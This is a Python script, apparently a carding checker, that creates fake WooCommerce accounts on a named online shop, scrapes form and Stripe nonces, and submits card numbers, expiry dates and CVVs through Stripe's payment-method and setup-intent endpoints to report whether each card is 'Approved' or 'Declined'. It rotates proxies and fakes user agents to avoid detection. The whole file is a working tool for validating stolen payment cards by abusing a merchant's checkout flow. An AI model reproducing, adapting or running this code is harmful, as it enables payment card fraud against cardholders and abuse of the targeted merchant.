import requests, re, json, random
from faker import Faker
from bs4 import BeautifulSoup
from proxy_manager import get_proxy_dict

fake = Faker()
domain = "https://www.epicalarc.com"

def generate_user():
    fname = fake.first_name().lower()
    lname = fake.last_name().lower()
    email = f"{fname}{lname}{random.randint(1000,9999)}@example.com"
    password = fake.password(length=10, special_chars=True)
    return fname, lname, email, password

def register_user(session, proxies):
    fname, lname, email, password = generate_user()
    res = session.get(f"{domain}/my-account/", proxies=proxies)
    soup = BeautifulSoup(res.text, "html.parser")
    nonce = soup.find("input", {"name": "woocommerce-register-nonce"})["value"]
    referer = soup.find("input", {"name": "_wp_http_referer"})["value"]
    data = {
        "email": email,
        "password": password,
        "register": "Register",
        "woocommerce-register-nonce": nonce,
        "_wp_http_referer": referer,
    }
    headers = {
        "origin": domain,
        "referer": f"{domain}/my-account/",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": fake.user_agent(),
    }
    session.post(f"{domain}/my-account/", headers=headers, data=data, proxies=proxies)

def get_stripe_key_and_nonce(session, proxies):
    res = session.get(f"{domain}/my-account/add-payment-method/", proxies=proxies)
    html = res.text
    stripe_pk = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
    nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
    if not stripe_pk or not nonce:
        raise Exception("Failed to extract stripe_pk or nonce")
    return stripe_pk.group(0), nonce.group(1)

def create_payment_method(stripe_pk, card, exp_month, exp_year, cvv, proxies):
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": fake.user_agent(),
    }
    data = {
        "type": "card",
        "card[number]": card,
        "card[cvc]": cvv,
        "card[exp_year]": exp_year[-2:],
        "card[exp_month]": exp_month,
        "billing_details[address][postal_code]": "10001",
        "billing_details[address][country]": "US",
        "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
        "key": stripe_pk,
        "_stripe_version": "2024-06-20",
    }
    r = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, proxies=proxies)
    return r.json().get("id")

def confirm_setup(session, pm_id, nonce, proxies):
    headers = {
        "x-requested-with": "XMLHttpRequest",
        "origin": domain,
        "referer": f"{domain}/my-account/add-payment-method/",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": fake.user_agent(),
    }
    data = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }
    res = session.post(f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", headers=headers, data=data, proxies=proxies)
    return res.text

def stripe_auth(card_input):
    try:
        card, month, year, cvv = card_input.split("|")
        session = requests.Session()
        proxies = get_proxy_dict()
        
        register_user(session, proxies)
        stripe_pk, nonce = get_stripe_key_and_nonce(session, proxies)
        pm_id = create_payment_method(stripe_pk, card, month, year, cvv, proxies)
        if not pm_id:
            return "Failed to create Payment Method"

        result = confirm_setup(session, pm_id, nonce, proxies)

        try:
            rjson = json.loads(result)
            if rjson.get("success") and rjson["data"].get("status") == "succeeded":
                return "Approved"
            else:
                error = rjson.get("data", {}).get("error", {}).get("message", result)
                return error if error else "Declined"
        except:
            return result
    except Exception as e:
        return str(e)
